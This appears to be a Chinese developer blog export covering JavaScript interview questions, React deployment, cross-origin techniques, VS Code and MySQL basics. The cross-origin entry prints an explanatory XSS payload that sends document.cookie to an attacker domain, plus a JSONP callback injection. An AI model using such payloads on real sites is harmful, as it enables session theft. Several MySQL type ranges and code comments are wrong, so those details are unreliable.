现在，我们知道我们可以使用arguments []数组访问JavaScript函数中的任意数量的参数。 因此arguments0只不过是调用fn（）。在fn里面，这个函数的作用域成为参数数组，并且记录参数[]的长度将返回2。 因此输出将如上所述。 考虑下面的代码。输出是什么，为什么12345678910(function () &#123; try &#123; throw new Error(); &#125; catch (x) &#123; var x = 1, y = 2; console.log(x); &#125; console.log(x); console.log(y);&#125;)(); 1231undefined2 var语句被挂起（没有它们的值初始化）到它所属的全局或函数作用域的顶部，即使它位于with或catch块内。但是，错误的标识符只在catch块内部可见。它相当于： 123456789101112(function () &#123; var x, y; // outer and hoisted try &#123; throw new Error(); &#125; catch (x /* inner */) &#123; x = 1; // inner x, not the outer one y = 2; // there is only one y, which is in the outer scope console.log(x /* inner */); &#125; console.log(x); console.log(y);&#125;)(); 这段代码的输出是什么123456var x = 21;var girl = function () &#123; console.log(x); var x = 20;&#125;;girl (); 21，也不是20，结果是‘undefined’的 这是因为JavaScript初始化没有被挂起。 （为什么它不显示21的全局值？原因是当函数执行时，它检查是否存在本地x变量但尚未声明它，因此它不会查找全局变量。 ） 你如何克隆一个对象12var obj = &#123;a: 1 ,b: 2&#125;var objclone = Object.assign(&#123;&#125;,obj); 现在objclone的值是{a：1，b：2}，但指向与obj不同的对象。 但请注意潜在的缺陷：Object.clone（）只会执行浅拷贝，而不是深拷贝。这意味着嵌套的对象不会被复制。他们仍然引用与原始相同的嵌套对象： 123456789101112131415161718let obj = &#123; a: 1, b: 2, c: &#123; age: 30 &#125;&#125;;var objclone = Object.assign(&#123;&#125;,obj);console.log('objclone: ', objclone);obj.c.age = 45;console.log('After Change - obj: ', obj); // 45 - This also changesconsole.log('After Change - objclone: ', objclone); // 45for (let i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000 );&#125; 此代码将打印什么123for (let i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;, i * 1000 );&#125; 它会打印0 1 2 3 4，因为我们在这里使用let而不是var。变量i只能在for循环的块范围中看到。 以下几行输出什么，为什么12console.log(1 &lt; 2 &lt; 3);console.log(3 &gt; 2 &gt; 1); 第一条语句返回true，如预期的那样。 第二个返回false是因为引擎如何针对&lt;和&gt;的操作符关联性工作。它比较从左到右，所以3&gt; 2&gt; 1 JavaScript翻译为true&gt; 1. true具有值1，因此它比较1&gt; 1，这是错误的。 如何在数组的开头添加元素？最后如何添加一个1234var myArray = ['a', 'b', 'c', 'd'];myArray.push('end');myArray.unshift('start');console.log(myArray); // ["start", "a", "b", "c", "d", "end"] 使用ES6，可以使用扩展运算符： 12myArray = ['start', ...myArray];myArray = [...myArray, 'end']; 或者，简而言之： 1myArray = ['start', ...myArray, 'end']; 想象一下你有这样的代码吗1var a = [1, 2, 3]; a）这会导致崩溃吗？ 1a[10] = 99; b）这个输出是什么？ 1console.log(a[6]); a）它不会崩溃。 JavaScript引擎将使阵列插槽3至9成为“空插槽”。 b）在这里，a [6]将输出未定义的值，但时隙仍为空，而不是未定义的。在某些情况下，这可能是一个重要的细微差别。例如，使用map（）时，map（）的输出中的空插槽将保持为空，但未定义的插槽将使用传递给它的函数重映射： 1234var b = [undefined];b[2] = 1;console.log(b); // (3) [undefined, empty × 1, 1]console.log(b.map(e =&gt; 7)); // (3) [7, empty × 1, 7] typeof undefined == typeof NULL的值是什么该表达式将被评估为true，因为NULL将被视为任何其他未定义的变量。 注意：JavaScript区分大小写，我们在这里使用NULL而不是null。 代码返回后会怎么样123console.log(typeof typeof 1);string typeof 1将返回“number”，typeof“number”将返回字符串。 以下代码输出什么？为什么1234567891011var b = 1;function outer()&#123; var b = 2 function inner()&#123; b++; var b = 3; console.log(b) &#125; inner();&#125;outer(); 输出到控制台将是“3”。 在这个例子中有三个闭包，每个都有它自己的var b声明。当调用变量时，将按照从本地到全局的顺序检查闭包，直到找到实例。由于内部闭包有自己的b变量，这就是输出。 此外，由于提升内部的代码将被解释如下： 123456function inner () &#123; var b; // b is undefined b++; // b is NaN b = 3; // b is 3 console.log(b); // output "3"&#125; 面试比棘手的技术问题要多，所以这些仅仅是作为指导。并不是每个值得聘用的“A”候选人都能够回答所有问题，也不会回答他们都保证有“A”候选人。在这一天结束时，招聘仍然是一门艺术，一门科学 - 还有很多工作。. 原文链接:https://www.toptal.com/javascript/interview-questions转载链接:https://www.zcfy.cc/article/37-essential-javascript-interview-questions-and-answers]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[create-react-app]]></title>
    <url>%2Fcreate-react-app%2F</url>
    <content type="text"><![CDATA[近期，趁着空闲时间，学习了下react的相关知识，对于配置问题，为了方便快速上手，就采用了官方的create-react-app来配置环境。期间遇到不少问题。总结一下。 项目基本完成，还有一些需要小优化。展示链接http://luckyp.top/cnode/，备用链接https://rcnode.luckyp.top/ 写在前面对于react来说，需要注意的就是它的生命周期问题，网上有大量的资料，一幅图简单的说明如下 生命周期 调用次数 能否使用 setSate() getDefaultProps 1(全局调用一次) 否 getInitialState 1 否 componentWillMount 1 是 render &gt;=1 否 componentDidMount 1 是 componentWillReceiveProps(nextProps) &gt;=0 否 shouldComponentUpdate(nextProps,nextState) &gt;=0 否 componentWillUpdate(nextProps,nextState) &gt;=0 否 componentDidUpdate(prevProps,prevState) &gt;=0 否 componentWillUnmount 1 否 create-react-app配置文件为了方便使用，create-react-app提供了直接暴露配置文件的方法,如下 1npm run eject 当然是单向不可逆操作的，为了尽可能的减少改变源码的操作，使用了另外一种办法，通过react-app-rewired 1npm install react-app-rewired --save-dev 简单的使用方式就是在根目录创建一个config-overrides.js文件,调整package.json的默认配置。详细配置见github。 1234567891011121314/* config-overrides.js */module.exports = function override(config, env) &#123; //do stuff with the webpack config... return config;&#125;/* package.json */ "scripts": &#123;- "start": "react-scripts start",+ "start": "react-app-rewired start",- "build": "react-scripts build",+ "build": "react-app-rewired build",- "test": "react-scripts test --env=jsdom",+ "test": "react-app-rewired test --env=jsdom"&#125; github pages部署homepage设置在项目完成之后，打包，通过的也是npm run build（同yarn run build）,如果直接上传到github服务器托管会存在路径问题，这里查看文档可以知道。需要在package.json中设置 1"homepage": "http://mywebsite.com/relativepath", 如果没有托管的服务器地址，也可以设置为 1"homepage":"." 项目页面设置因为上传的GitHub用户页面被博客占用，所以只能使用项目页面，需要添加gh-pages 12345678npm install --save gh-pages/* package.json */"scripts": &#123;+ "predeploy": "npm run build",+ "deploy": "gh-pages -d build", "start": "react-app-rewired start", "build": "react-app-rewired build", npm run deploy会执行predeploy,同时上传创建github的分支，默认gh-pages分支。进入项目主页，设置gh-pages分支展示为page即可。 这时候页面的展示地址应该是https://myusername.github.io/project-name。 路由设置因为使用react-router@^4，所以还需要设置在&lt;Router&gt;中设置basename，该值为你的项目名称。这里我的项目是名称是cnode。 可以新建一个文件,然后导出，判断是否为开发环境，以便用于域名的二级目录。 123let basename = process.env.NODE_ENV === 'production' ? '/cnode' : '';export default basename 因为需要部署到github，而GitHub Pages存在一个问题，不支持pushState引擎盖下使用HTML5 历史API的路由器（例如，使用React Router browserHistory）。因为在https://myusername.github.io/project-name/topics中,/topics属于前端部分，后端获取不到，会报404错误。 这里有两种解决方式，一种就是通过重定向，当404时，跳转你设置好的页面，另一种就是使用hashHistory,不过存在的问题是，路径过长，这里我采用的是第二种方法。]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>脚手架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域]]></title>
    <url>%2F%E8%B7%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[关于浏览器跨域，经常会遇到这方面的问题，整理一下相关资源。 跨域概念举个简单的例子：一个地址为URLA的页面A试图请求另一个地址为URLB的资源。 它们的地址（URLA/URLB）中主机名（域名）、协议、端口号，只要有一个不相同，就为不同的域（或源），即异源，注意即便两个不同的域名指向同一个ip地址，也是异源。 相对的，如果相同，即为浏览器的同源策略/SOP（Same origin policy），同源策略限制以下几种行为： Cookie、LocalStorage 和 IndexDB 无法读取 DOM 和 Js对象无法获得 AJAX 请求不能发送 跨域方案JSONP浏览器允许html标签从不同域名下加载静态资源，在此基础上，可通过动态创建script标签，请求一个带参数的网址实现跨域通信。 缺点是只能通过GET方式请求。 123456789101112131415161718192021// JavaScriptvar script = document.createElement('script');script.type = 'text/javascript';// 传参并指定回调执行函数为backscript.src = 'http://example.com/login?callback=back';document.head.appendChild(script);// jquery$.ajax(&#123; url: 'http://example.com/login', type: 'get', dataType: 'jsonp', // 请求方式为jsonp jsonpCallback: "back", // 自定义回调函数名&#125;);// 需要回调执行函数function back(res) &#123; alert(JSON.stringify(res));&#125;// 服务端返回back(&#123;"status": true, "user": "admin"&#125;) document.domain仅适用于主域相同，子域不同。可以共享Cookie。 www.example.com/a.html 和child.example.com/b.html相互之间的通信，两个页面都需要设置：document.domain = &#39;example.com&#39;; 123456789// 结合iframe实现更多跨域// www.example.com/a.htmldocument.domain = 'domain.com';var user = 'admin';// child.example.com/b.htmldocument.domain = 'domain.com';alert('父窗口变量user' + window.parent.user); window.name适用于iframe嵌套。 window.name是在同一个浏览器窗口下打开的所有页面共享的字段，最多可支持2MB。可以通过在b.html中设置window.name的值，在a.html中取出改值使用。 123456789101112131415161718192021222324252627282930313233343536// www.domain1.com/a.htmlvar proxy = function(url, callback) &#123; var state = 0; var iframe = document.createElement('iframe'); // 加载跨域页面 iframe.src = url; // onload事件会触发2次，第1次加载跨域页，并留存数据于window.name iframe.onload = function() &#123; if (state === 1) &#123; // 第2次onload(同域proxy页)成功后，读取同域window.name中数据 callback(iframe.contentWindow.name); destoryFrame(); &#125; else if (state === 0) &#123; // 第1次onload(跨域页)成功后，切换到同域代理页面 iframe.contentWindow.location = 'http://www.domain1.com/proxy.html'; state = 1; &#125; &#125;; document.body.appendChild(iframe); // 获取数据以后销毁这个iframe，释放内存；这也保证了安全（不被其他域frame js访问） function destoryFrame() &#123; iframe.contentWindow.document.write(''); iframe.contentWindow.close(); document.body.removeChild(iframe); &#125;&#125;;// 请求跨域b页面数据proxy('http://www.domain2.com/b.html', function(data)&#123; alert(data);&#125;)// www.domain1.com/proxy.html代理页面，内容为空即可。// www.domain2.com/b.html window.name = 'This is domain2 data!'; window.postMessagepostMessage是HTML5 XMLHttpRequest Level 2的新增API，下面为MDN给的示例。 otherWindow.postMessage(message, targetOrigin, [transfer]) otherWindow:其他窗口的一个引用，比如iframe的contentWindow属性、执行window.open返回的窗口对象、或者是命名过或数值索引的window.frames。 message:将要发送到其他 window的数据。 targetOrigin:通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串”*”（表示无限制）或者一个URI。 transfer:是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。 123456789101112131415161718192021222324252627282930313233343536&lt;!-- www.example1.com/a.html --&gt;&lt;iframe id="iframe" src="http://www.example2.com/b.html" style="display:none;"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); iframe.onload = function() &#123; var data = &#123; msg: '1+1', &#125;; // 传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.example2.com'); &#125;; // 接收example2数据 function receiveMessage(e)&#123; if (event.origin !== "http://www.example2.com") return; alert('来自页面B:' + e.data); &#125; window.addEventListener('message', receiveMessage, false);&lt;/script&gt;&lt;!-- www.example2.com/b.html --&gt;&lt;script&gt; //接收example1数据 function receiveMessage(e)&#123; if (event.origin !== "http://www.example1.com") return; alert('来自页面A:' + e.data); var data = JSON.parse(e.data); if (data) &#123; data.sum = 2; // 处理后再发回example1 window.parent.postMessage(JSON.stringify(data), 'http://www.example1.com'); &#125; &#125; window.addEventListener('message', receiveMessage, false);&lt;/script&gt; CORSCORS即跨域资源共享（Cross-origin resource sharing）。详细介绍可参考跨域资源共享 CORS 详解。 普通的请求只需服务端设置Access-Control-Allow-Origin即可，前端无须设置。带Cookie请求，前端常用设置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* 原生ajax*/var xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容// 前端设置是否带cookiexhr.withCredentials = true;xhr.open('post', 'http://www.domain2.com:8080/login', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send('user=admin');xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; alert(xhr.responseText); &#125;&#125;;/* jquery*/$.ajax(&#123; ... xhrFields: &#123; withCredentials: true // 前端设置是否带cookie &#125;, crossDomain: true, // 会让请求头中包含跨域的额外信息，但不会含cookie ...&#125;);/* axios ==&gt; withCredentials: true*/import axios from 'axios'// 创建axios实例const service = axios.create(&#123; baseURL: process.env.BASE_API, // node环境的不同，对应不同的baseURL timeout: 5000, // 请求的超时时间 //设置默认请求头，使post请求发送的是formdata格式数据// axios的header默认的Content-Type好像是'application/json;charset=UTF-8',我的项目都是用json格式传输，如果需要更改的话，可以用这种方式修改 // headers: &#123; // "Content-Type": "application/x-www-form-urlencoded" // &#125;, withCredentials: true // 允许携带cookie&#125;)// node后台const express = require('express')const app = express()const cors = require('cors') // 此处我的项目中使用express框架，跨域使用了cors npm插件app.use(cors&#123; credentials: true, origin: 'http://localhost:8081', // web前端服务器地址 // origin: '*' // 这样会出错&#125;) WebSocket只要服务端支持就可以使用。 12345678910111213141516171819202122232425262728// expressvar app = require('express')();var server = require('http').Server(app);var io = require('socket.io')(server);server.listen(80);// WARNING: app.listen(80) will NOT work here!app.get('/', function (req, res) &#123; res.sendfile(__dirname + '/index.html');&#125;);io.on('connection', function (socket) &#123; socket.emit('news', &#123; hello: 'world' &#125;); socket.on('my other event', function (data) &#123; console.log(data); &#125;);&#125;);// index.html&lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;&lt;script&gt; var socket = io.connect('http://localhost'); socket.on('news', function (data) &#123; console.log(data); socket.emit('my other event', &#123; my: 'data' &#125;); &#125;);&lt;/script&gt; 跨域攻击CSRF/XSRF攻击示例如下，防止CSRF攻击的方法是referer过滤校验+token验证，即服务端检测JSON文件调用来源和检查token数据是否匹配。 XSS攻击提交含有恶意脚本的数据到服务器，从而达到破坏页面甚至盗取cookie伪装登录等目的。例如，在a.com/index.ftl中有如下代码：欢迎你，${username}，这时恶意网站b.com传递参数：username=&lt;script&gt;window.open(“www.b.com?param=”+document.cookie)&lt;/script&gt;这样就轻而易举地盗取了用户的cookie值了。在jsonp跨域访问中，xss注入主要是callback参数注入，如：&lt;script src=&quot;http://www.a.com/getData.do?callback=&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot;&gt;&lt;/script&gt;防止措施是对参数进行校验过滤。 参考链接https://segmentfault.com/a/1190000003784372https://www.cnblogs.com/roam/p/7520433.html]]></content>
      <categories>
        <category>ajax</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode插件]]></title>
    <url>%2Fvscode%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[备忘一下Visual Studio Code经常使用的插件，便于日后食用。 vscode安装在Windows系统下，通过官方链接地址下载相应的版本。一路默认安装，注意在点击下一步的时候，是否勾选配置环境变量，默认勾选。 vscode插件顺序按A-Z排。比较好用的插件加粗显示。扩展高亮智能提示插件自行选择。 any-rule: 常用正则 Auto Rename Tag : 自动更换html的对应标签 Auto Close Tag : 自动闭合标签（存在有一定的小问题） Autoprefixer : css自动补全兼容写法，一般 F1 键，指令Autoprefixer CSS Beautify : 格式化文件，一般 F1 键，指令Beautify file Better Comments : 编写更加人性化的注释 Bracket Pair Colorizer : 用颜色标识匹配的括号(编辑器已内置) Bootstrap 3 Snippets : Bootstrap 3扩展智能提示 Chinese (Simplified) Language Pack for Visual Studio Code : 1.23版本之后，语言需要通过包的方式安装。（2018/5/4补充） Code Spell Checker : 单词拼写检查 Debugger for Chrome : 静态文件chrome调试(已内置) Document This : 注释文档自动生成 DotENV : .env文件高亮 Dracula Theme : 主题 EditorConfig for VS Code : .editorconfig的支持插件。 ESLint : 静态代码检查 filesize : 在底部状态栏显示当前文件大小，点击后还可以看到详细创建、修改时间 Git History : git历史 GitLens : git日志插件 HTML CSS Support : html标签上智能提示当前项目所支持的样式class和scss名 HTML Snippets : HTML5代码片段以及提示 HTMLHint : html代码检测 IntelliSense for CSS class names in HTML : html标签上智能提示当前项目所支持的样式class名 JavaScript Atom Grammar : 扩展vscode代码中的js语法替换Atom编辑器中的js语法 Import Cost : 成本提示 jQuery Code Snippets : jQuery扩展智能提示 JS JSX Snippets : JS,JSX,TS扩展智能提示 Live Server : 起本地服务，右键菜单 markdownlint : markdown语法检测 npm : npm指令扩展 npm intellisense : 提示npm模块引用 OneDark-Pro : 比较喜欢的主题 Path Autocomplete : 路径补全 Path Intellisense : 文件路径智能提示 Project Manager : 多个项目快速切换 REST Client : 功能类似postman，但更强大 Sass : Sass高亮，自动补全，智能提示 Settings Sync VSCode : 设置同步到Gist(可同步插件，用户配置项。) StandardJS - JavaScript Standard Style : 代码格式StandardJS Sublime Babel : babel语法高亮，智能提示 Vetur : vue语法高亮，注释，扩展等 View In Browser : files协议打开文件在浏览器 vscode-fileheader : 顶部注释模板 vscode-icons : icons图标 Vue 2 Snippets : vue2扩展智能提示 VueHelper : snippets for Vue,Vue-router x-translator : 一键翻译、命名规则、替换。 不务正业类 vsinder: 类似约会应用程序，左划右划在上面刷代码 小霸王: 童年的回忆，游戏插件 VSC Netease Music: 网易云音乐插件 vscode-background: 背景插件 z-reader: 小说阅读插件,支持在线搜索和本地阅读,支持 txt 和 epub 格式 韭菜盒子: 股票 &amp; 基金 &amp; 期货实时数据，做最好用的投资插件 LeetCode: 在 VS Code 中练习 LeetCode Qwerty Learner: 单词记忆与英语肌肉记忆锻炼软件 Eslint配置VSCode 扩展设置，依次点击 文件 &gt; 首选项 &gt; 设置 打开 VSCode 配置文件,添加如下配置，这样每次保存的时候就可以根据根目录下.eslintrc.js你配置的eslint规则来检查和做一些简单的fix。 123456789"eslint.validate": [ "javascript", "javascriptreact", "html", &#123; "language": "vue", "autoFix": true &#125; ], "eslint.options": &#123; "plugins": ["html"] &#125;]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
        <tag>vscode</tag>
        <tag>eslint</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[progress]]></title>
    <url>%2Fprogress%2F</url>
    <content type="text"><![CDATA[进度条美化库nprogress和Html5的progress标签简要。 nprogress关于github这种加载的进度条，简单了解发现使用的https://github.com/rstacruz/nprogress这种。 CDN地址 https://unpkg.com/nprogress@0.2.0/nprogress.js https://unpkg.com/nprogress@0.2.0/nprogress.css 基本原理是监听页面ajax请求前、ajax请求变化和ajax请求后的事件，来模拟进度条加载情况。 简单demo 1234NProgress.start();NProgress.done();NProgress.remove(); Jquery使用demo 123456$("#loading").ajaxStart(function()&#123; NProgress.start();&#125;);$("#loading").ajaxStop(function()&#123; NProgress.done();&#125;); 没有ajax的demo 123456$(document).ready(function()&#123; NProgress.start();&#125;)$(window).load(function()&#123; NProgress.done();&#125;) Turbolinks和Pjax的使用方式见https://github.com/rstacruz/nprogress。 ProgressHtml5的特性中也有进度条，兼容性较差。各个浏览器显示状态不太一致。 简单使用 1&lt;progress&gt;&lt;/progress&gt; 具体使用见MDN。 自定义样式见http://www.zhangxinxu.com/wordpress/2013/02/html5-progress-element-style-control/]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>美化</tag>
        <tag>progress</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[加密文件]]></title>
    <url>%2F%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[维多利亚的秘密。测试加密]]></content>
  </entry>
  <entry>
    <title><![CDATA[vscode debugging]]></title>
    <url>%2Fvscode-debugging%2F</url>
    <content type="text"><![CDATA[vscode自身带有调试工具，简单说明下使用方法。 官方本身的文档中有相关的介绍，不过介绍的很简单，官方文档地址https://code.visualstudio.com/docs/editor/debugging. 调试界面要打开Debug视图,可以通过键Ctrl + Shift + d，或者鼠标点击下图图标所示。 配置文件启动配置最简单的方式是F5，因为没有配置文件，会出现命令选项窗口。 选择node(或者你需要的调试环境)，这里chrome选项是Debugger for Chrome插件提供的。 选择后，在当前工作区会出现.vscode文件夹。其中有launch.json文件，它默认提供了一种方式。 1234567891011121314&#123; // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "Launch Program", "program": "$&#123;workspaceFolder&#125;/app.js" &#125; ]&#125; 简要参数以下属性对于每个启动配置都是必需的： type - 用于此启动配置的调试器类型。每安装调试扩展引入一个类型，例如，node对于内置的节点调试器，或php与go对PHP和去扩展。 request - 此启动配置的请求类型。目前支持的是launch和attach。 name - 出现在Debug启动配置下拉列表中的友好名称。 以下是适用于所有启动配置的一些可选属性： preLaunchTask- 要在调试会话开始前启动任务，请将此属性设置为tasks.json（位于工作区.vscode文件夹下）中指定的任务的名称。 postDebugTask- 要在调试会话的最后启动任务，请将此属性设置为tasks.json（位于工作区.vscode文件夹下）中指定的任务的名称。 internalConsoleOptions - 在调试会话期间控制调试控制台面板的可见性 debugServer- 仅限调试扩展作者：连接到指定的端口，而不是启动调试适配器 许多调试器支持以下一些属性： program - 启动调试器时运行的可执行文件或文件 args - 传递给程序进行调试的参数 env- 环境变量（该值null可用于“取消定义”变量） cwd - 用于查找依赖关系和其他文件的当前工作目录 port - 连接到正在运行的进程时的端口 stopOnEntry - 节目启动时立即中断 console-要使用什么样的主机，例如internalConsole，integratedTerminal，externalTerminal。 常用的变量替换 ${workspaceFolder}工作区文件夹的根路径 ${file}活动编辑器中打开的文件 ${env:Name}环境变量“Name”的示例 多目标调试使用多目标调试很简单：在开始第一个调试会话之后，您可以启动另一个会话。只要第二个会话启动并运行，VS Code UI切换到多目标模式 复合启动另一种启动多个调试会话的方法是使用所谓的复合启动配置。复合启动配置列出了应该并行启动的两个或更多启动配置的名称。复合启动配置显示在启动配置下拉菜单中。 12345678910111213141516171819202122232425&#123; "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "Server", "program": "$&#123;workspaceFolder&#125;/server.js", "cwd": "$&#123;workspaceFolder&#125;" &#125;, &#123; "type": "node", "request": "launch", "name": "Client", "program": "$&#123;workspaceFolder&#125;/client.js", "cwd": "$&#123;workspaceFolder&#125;" &#125; ], "compounds": [ &#123; "name": "Server/Client", "configurations": ["Server", "Client"] &#125; ]&#125; 简单例子使用的chrome配合node调试。 123456789101112131415161718192021222324252627282930313233&#123; // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "node服务", "program": "$&#123;workspaceFolder&#125;/index.js" &#125;, &#123; "name": "Chrome调试", "type": "chrome", "request": "launch", "file": "$&#123;workspaceRoot&#125;/index.js", // "url": "http://mysite.com/index.html", //使用外部服务器时,请注释掉 file, 改用 url "runtimeExecutable": "C:\\Users\\PC\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe", // 改成您的 Chrome 安装路径 "sourceMaps": true, "webRoot": "$&#123;workspaceRoot&#125;", // "preLaunchTask":"build", "userDataDir":"$&#123;tmpdir&#125;", // "port":5433 &#125; ], "compounds": [ &#123; "name": "Compound", "configurations": ["node服务","Chrome调试"] &#125; ]&#125;]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>编辑器</tag>
        <tag>vscode</tag>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL简要]]></title>
    <url>%2FMySQL%E7%AE%80%E8%A6%81%2F</url>
    <content type="text"><![CDATA[学习node的过程中，需要用到数据库提供数据，简要学习MySQL其基本操作。 数据库基础数据库（Database）是按照数据结构来组织、存储和管理数据的仓库，每个数据库都有一个或多个不同的API用于创建，访问，管理，搜索和复制所保存的数据。 RDBMSMySQL属于关系型数据库。关系型数据库管理系统（RDBMS）的主要特点在于： 数据以表格的形式出现 每行为各种记录名称 每列为记录名称所对应的数据域 许多的行和列组成一张表单 若干的表单组成database RDBMS术语 数据库: 数据库是一些关联表的集合。. 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。 列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。 主键：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。 外键：外键用于关联两个表。 复合键：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。 索引：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。 参照完整性: 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。 MySQL数据类型MySQL有三大类数据类型, 分别为数字、日期\时间、字符串, 这三大类中又更细致的划分了许多子类型: 数字类型 整数: tinyint、smallint、mediumint、int、bigint 浮点数: float、double、real、decimal 日期和时间: date、time、datetime、timestamp、year 字符串类型 字符串: char、varchar 文本: tinytext、text、mediumtext、longtext 二进制(可用来存储图片、音乐等): tinyblob、blob、mediumblob、longblob 具体见附录。 MySQL操作基础管理 mysql -h 主机地址 -u 用户名 -p 用户密码;:链接mysql数据库 12mysql -u root -p #链接本机mysqlmysql -h 110.110.110.110 -u root -p abcd123 #链接远程主机上的mysql mysqladmin -u用户名 -p旧密码 password 新密码;:修改密码 grant select on 数据库.* to 用户名@登录主机 identified by \&quot;密码\&quot;:增加新用户 创建数据库create database 数据库名 [其他选项]; 1create database test_db character set gbk; #便于在命令符下显示中文 查看数据库show databases:列出 MySQL 数据库管理系统的数据库列表。 选择数据库12mysql -D 所选择的数据库名 -h 主机名 -u 用户名 -p #登录时选择use 所选择的数据库名 #登录后选择 创建数据库表create table 表名称(列声明); 12345678create table students ( id int unsigned not null auto_increment primary key, name char(8) not null, sex char(4) not null, age tinyint unsigned not null, tel char(13) null default &quot;-&quot; ); id为列的名称。 int为整数类型(取值范围为 -8388608到8388607)。 unsigned设置无符号位(取值范围为 0到8388607)。 not null不能为空必填项。auto_increment在插入数据时若该列为 NULL, MySQL将自动产生一个比现存值更大的唯一标识符值。在每张表中仅能有一个这样的值且所在列必须为索引列。 primary key该列是表的主键, 本列的值必须唯一, MySQL将自动索引该列。 char(8) 长度为8的字符串。 tinyint取值范围为 -127到128的整数类型。 null default “-“ 值为空时默认- 查看数据库表 describe 表名:可查看已创建的表的详细信息。 show tables:显示指定数据库的所有表，使用该命令前需要使用 use 命令来选择要操作的数据库。 1show tables; show columns from 数据表:显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。 1show columns from students; show index from 数据表:显示数据表的详细索引信息，包括PRIMARY KEY（主键）。 1show index from students; show table status like [from db_name] [like &#39;pattern&#39;] \G:该命令将输出MySQL数据库管理系统的性能及统计信息。 1234show table status from test_db; # 显示数据库 test_db 中所有表的信息show table status from test_db like &apos;test%&apos;; # 表名以test_db开头的表的信息show table status from test_db like &apos;test%&apos;\G; # 加上 \G，查询结果按列打印 表格插入数据insert [into] 表名 [(列名1, 列名2, 列名3, …)] values (值1, 值2, 值3, …); 1insert into students (name, sex, age) values(&quot;小红&quot;, &quot;女&quot;, 12); 查询表中数据select 列名称 from 表名称 [查询条件]; 1234select name,age from students; #显示所有人的name,age信息select * from students where sex=&quot;女&quot;; #性别是女的所有人信息select * from students where name like &quot;%小%&quot;; #名字中含有小的所有人信息select * from students where id&gt;5 and age&gt;10; #id小于5且年龄大于10的所有人信息 更新表中数据update 表名称 set 列名称=新值 where 更新条件; 12update students set age=age+1; #所有人的年龄增加1update students set tel=default where id=5; #将id为5的手机号改为默认的&quot;-&quot; 删除表中数据delete from 表名称 where 删除条件; 1delete from students where id=3; #将id为3的人数据删除 添加表列alter table 表名 add 列名 列数据类型 [after 插入位置]; 12alter table students add address char(60); #在表的最后追加列 addressalter table students add birthday date after age; #在名为age的列后插入列 birthday 修改表列alter table 表名 change 列名称 列新名称 新数据类型; 12alter table students change tel telphone char(13) default &quot;-&quot;;#将表 tel 列改名为 telphone 删除表列alter table 表名 drop 列名称; 1alter table students drop birthday; #删除brithday列 重命名数据表alter table 表名 rename 新表名; 1alter table students rename children; 删除整张数据库表drop table 表名; 1drop table children; 删除整个数据库drop database 数据库名; 1drop database test_db; 附录 整数类型 含义（有符号） tinyint(m) 1个字节 范围(-128~127) smallint(m) 2个字节 范围(-32768~32767) mediumint(m) 3个字节 范围(-8388608~8388607) int(m) 4个字节 范围(-2147483648~2147483647) bigint(m) 8个字节 范围(+-9.22*10的18次方) 浮点类型 含义 float(m,d) 单精度浮点型 8位精度(4字节) m总个数，d小数位 double(m,d) 双精度浮点型 16位精度(8字节) m总个数，d小数位 decimal(m,d) 精确值（上述两种为近似值） m总个数，d小数位 字符串类型 含义 char(n) 固定长度，最多255个字符 varchar(n) 可变长度，最多65535个字符 tinytext 可变长度，最多255个字符 text 可变长度，最多65535个字符 mediumtext 可变长度，最多2的24次方-1个字符 longtext 可变长度，最多2的32次方-1个字符 日期时间类型 含义 date 日期 ‘2008-12-2’ year 日期 